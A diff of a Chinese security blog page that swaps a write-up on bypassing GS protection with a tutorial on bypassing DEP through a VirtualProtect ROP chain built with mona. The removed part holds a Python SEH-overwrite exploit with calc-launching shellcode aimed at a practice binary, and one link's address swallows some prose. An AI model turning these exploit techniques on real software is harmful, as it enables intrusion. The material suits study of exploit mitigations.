@@ -6,20 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://niwbie.github.io">
-  <title>PWN练习（绕过GS保护） | isee&#39;blog</title>
+  <title>Windows下的ROP绕过DEP保护 | isee&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="程序：test">
+  <meta name="description" content="这篇介绍经典的DEP绕过方法：通过VirtualProtect绕过DEP。test.exe
+DEP保护的原理，就是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，而有了DEP，此时CPU会抛出异常，而不是去执行指令
+如果我们让程序跳转到一个已经存在的系统函数中去呢？这时的DEP是不会拦截的，也就有了我们的ROP攻击。简而言之，只要为shell">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PWN练习（绕过GS保护）">
-<meta property="og:url" content="https://niwbie.github.io/2016/03/29/PWN练习(绕过GS保护)/index.html">
+<meta property="og:title" content="Windows下的ROP绕过DEP保护">
+<meta property="og:url" content="https://niwbie.github.io/2016/11/04/Windows下的ROP绕过DEP保护/index.html">
 <meta property="og:site_name" content="isee'blog">
-<meta property="og:description" content="程序：test">
-<meta property="og:image" content="https://niwbie.github.io/image/PWN练习_绕过GS保护/1.png">
-<meta property="og:updated_time" content="2017-03-29T13:49:13.316Z">
+<meta property="og:description" content="这篇介绍经典的DEP绕过方法：通过VirtualProtect绕过DEP。test.exe
+DEP保护的原理，就是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，而有了DEP，此时CPU会抛出异常，而不是去执行指令
+如果我们让程序跳转到一个已经存在的系统函数中去呢？这时的DEP是不会拦截的，也就有了我们的ROP攻击。简而言之，只要为shell">
+<meta property="og:image" content="https://niwbie.github.io/image/Windows下的ROP绕过DEP保护/1.png">
+<meta property="og:image" content="https://niwbie.github.io/image/Windows下的ROP绕过DEP保护/2.png">
+<meta property="og:image" content="https://niwbie.github.io/image/Windows下的ROP绕过DEP保护/3.png">
+<meta property="og:image" content="https://niwbie.github.io/image/Windows下的ROP绕过DEP保护/4.png">
+<meta property="og:image" content="https://niwbie.github.io/image/Windows下的ROP绕过DEP保护/5.png">
+<meta property="og:updated_time" content="2017-11-12T07:59:02.040Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PWN练习（绕过GS保护）">
-<meta name="twitter:description" content="程序：test">
-<meta name="twitter:image" content="https://niwbie.github.io/image/PWN练习_绕过GS保护/1.png">
+<meta name="twitter:title" content="Windows下的ROP绕过DEP保护">
+<meta name="twitter:description" content="这篇介绍经典的DEP绕过方法：通过VirtualProtect绕过DEP。test.exe
+DEP保护的原理，就是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，而有了DEP，此时CPU会抛出异常，而不是去执行指令
+如果我们让程序跳转到一个已经存在的系统函数中去呢？这时的DEP是不会拦截的，也就有了我们的ROP攻击。简而言之，只要为shell">
+<meta name="twitter:image" content="https://niwbie.github.io/image/Windows下的ROP绕过DEP保护/1.png">
   
     <link rel="alternative" href="/atom.xml" title="isee&#39;blog" type="application/atom+xml">
   
@@ -135,7 +145,7 @@
 </nav>
 
       <div class="body-wrap">
-        <article id="post-PWN练习(绕过GS保护)" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Windows下的ROP绕过DEP保护" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -145,7 +155,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      PWN练习（绕过GS保护）
+      Windows下的ROP绕过DEP保护
     </h1>
   
       
@@ -153,18 +163,35 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>程序：<a href="/image/PWN练习_绕过GS保护/test_x86_wo_safeseh_dep.exe">test</a><br><a id="more"></a></p>
-<p><img src="/image/PWN练习_绕过GS保护/1.png" alt="这里写图片描述"><br>漏洞很简单，就是逐字节读取文件，但是没有限制长度，导致栈溢出。<br>不过开启了GS保护（类似canary），所以如果直接用栈溢出覆盖返回地址，则会出错。所以这里利用SEH来绕过GS保护。</p>
-<p><a href="/2016/03/29/在栈中利用SEH/index.html">原理在这</a></p>
-<p>直接上python写文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">jmp_addr = &apos;\xeb\x06\x90\x90&apos;</div><div class="line">ppr_addr = &apos;\x31\x19\x0f\x01&apos;</div><div class="line"></div><div class="line">shellcode=[0xeb,0x67,0x55,0x8b,0xec,0x64,0xa1,0x30,0x0,0x0,0x0,0x8b,0x40,0xc,0x8b,0x40,0x14,0x8b,0x0,0x8b,0x70,0x28,0x80,0x7e,0xc,0x33,0x75,0xf5,0x8b,0x40,0x10,0x8b,0xf8,0x3,0x7f,0x3c,0x8b,0x7f,0x78,0x3,0xf8,0x8b,0xdf,0x8b,0x7b,0x20,0x3,0xf8,0x33,0xc9,0x8b,0x34,0x8f,0x3,0xf0,0x41,0x8b,0x54,0x24,0x8,0x39,0x16,0x75,0xf2,0x8b,0x54,0x24,0xc,0x39,0x56,0x4,0x75,0xe9,0x8b,0x7b,0x24,0x3,0xf8,0x8b,0xc,0x4f,0x81,0xe1,0xff,0xff,0x0,0x0,0x8b,0x7b,0x1c,0x3,0xf8,0x49,0xc1,0xe1,0x2,0x8b,0x3c,0xf,0x3,0xc7,0x5d,0xc2,0x8,0x0,0x68,0x78,0x65,0x63,0x0,0x68,0x57,0x69,0x6e,0x45,0xe8,0x8a,0xff,0xff,0xff,0x50,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0xe8,0x7a,0xff,0xff,0xff,0x50,0x6a,0x0,0x68,0x2e,0x65,0x78,0x65,0x68,0x63,0x61,0x6c,0x63,0x6a,0x5,0x8d,0x4c,0x24,0x4,0x51,0x8b,0x44,0x24,0x18,0xff,0xd0,0x83,0xc4,0xc,0x33,0xc0,0x50,0x8b,0x44,0x24,0x4,0xff,0xd0]</div><div class="line"></div><div class="line">fr = open(&apos;msg.dat&apos;,&apos;wb+&apos;)</div><div class="line"></div><div class="line">payload = &apos;A&apos;*84 + jmp_addr + ppr_addr</div><div class="line">fr.write(payload)</div><div class="line">for s in range(len(shellcode)):</div><div class="line">	fr.write(chr(shellcode[s]))</div><div class="line">over = &apos;c&apos;*(20000-len(payload))</div><div class="line">fr.write(over)</div></pre></td></tr></table></figure>
+        <p>这篇介绍经典的DEP绕过方法：通过VirtualProtect绕过DEP。<br><a href="/image/Windows下的ROP绕过DEP保护/test.exe）
+什么是DEP呢？
+溢出攻击的根源在于计算机对数据和代码没有明确区分，如果将代码放置于数据段，那么系统就会去执行
+为了弥补这一缺陷，微软从XP SP2开始支持数据执行保护(Data Exection Prevention">test.exe</a></p>
+<p>DEP保护的原理，就是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，而有了DEP，此时CPU会抛出异常，而不是去执行指令</p>
+<p>如果我们让程序跳转到一个已经存在的系统函数中去呢？这时的DEP是不会拦截的，也就有了我们的ROP攻击。<br>简而言之，只要为shellcode中的每条指令都在代码区找到替代指令，就可以完成我们的功能了。但是这种操作难度极大，并不是每条指令都能找到，所以就有了以下三种折中的办法:</p>
+<pre><code>通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行
+通过跳转到VirtualProtect函数来讲shellcode所在内存页设置为可执行状态，然后再转入shellcode执行。
+通过跳转到VirtualAllloc函数开辟一段具有执行权限的内存空间，然后将shellcode复制到这段内存中执行。
+</code></pre><p>这一节根据实例，介绍通过方法2来绕过DEP。</p>
+<p>先来看VirtualProtect函数：</p>
+<p>BOOL VirtualProtect{<br>LPVOID lpAddress,<br>DWORD dwsize,<br>DWORD flNewProtect,<br>PDWORD lpflOldProtect<br>}</p>
+<p>lpAddress:内存起始地址<br>dwsize:内存区域大小<br>flNewProtect:内存属性，PAGE_EXECUTE_READWRITE(0x40)<br>lpflOldProtect:内存原始属性保存地址</p>
+<p>先看程序，还是简单的栈溢出，只不过开了DEP保护：<br><img src="/image/Windows下的ROP绕过DEP保护/1.png" alt="这里写图片描述"></p>
+<p>使用ImmunityDebugger和插件mona，可以构造rop链：</p>
+<p>!mona rop -m *.dll -cp nonull</p>
+<p>执行后，会在ImmunityDebugger文件夹下生成<br>rop.txt、rop_chains.txt、rop_suggestions.txt、stackpivot.txt。<br>我们查看其中的rop_chains，选择其中的[C]：<br><img src="/image/Windows下的ROP绕过DEP保护/2.png" alt="这里写图片描述"></p>
+<p>这就是我们需要的ROP链了，前面跟上溢出长度，后面跟上我们的shellcode即可。</p>
+<p>执行起来，可以看到我们的堆栈编程这样：<br><img src="/image/Windows下的ROP绕过DEP保护/3.png" alt="这里写图片描述"></p>
+<p>F8往下走，可以看到经过一系列pop和retn可以在栈上构造VrtualProtect函数需要的参数，并调用该函数，可以通过eax判断是否调用成功：<br><img src="/image/Windows下的ROP绕过DEP保护/4.png" alt="这里写图片描述"></p>
+<p>然后就走到call esp：<br><img src="/image/Windows下的ROP绕过DEP保护/5.png" alt="这里写图片描述"></p>
+<p>这里到后面都是我们自己构造的shellcode了。</p>
 
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2016/03/29/PWN练习(绕过GS保护)/" class="archive-article-date">
-  	<time datetime="2016-03-29T13:28:12.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-03-29</time>
+      <a href="/2016/11/04/Windows下的ROP绕过DEP保护/" class="archive-article-date">
+  	<time datetime="2016-11-04T14:28:12.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-04</time>
 </a>
       
 	<div class="article-tag tagcloud">
@@ -182,18 +209,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2016/03/29/在栈中利用SEH/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2016/11/07/使用Hexo-Ghuhub搭建个人博客/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          在栈中利用SEH
+          使用Hexo+Git搭建个人博客
         
       </div>
     </a>
   
   
-    <a href="/2016/03/17/文件补丁/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">文件补丁</div>
+    <a href="/2016/11/03/看雪CTF-2016第一题Writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">看雪CTF 2016第一题Writeup</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -227,7 +254,7 @@
 
 <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="PWN练习(绕过GS保护)" data-title="PWN练习（绕过GS保护）" data-url="https://niwbie.github.io/2016/03/29/PWN练习(绕过GS保护)/"></div>
+	<div class="ds-thread" data-thread-key="Windows下的ROP绕过DEP保护" data-title="Windows下的ROP绕过DEP保护" data-url="https://niwbie.github.io/2016/11/04/Windows下的ROP绕过DEP保护/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
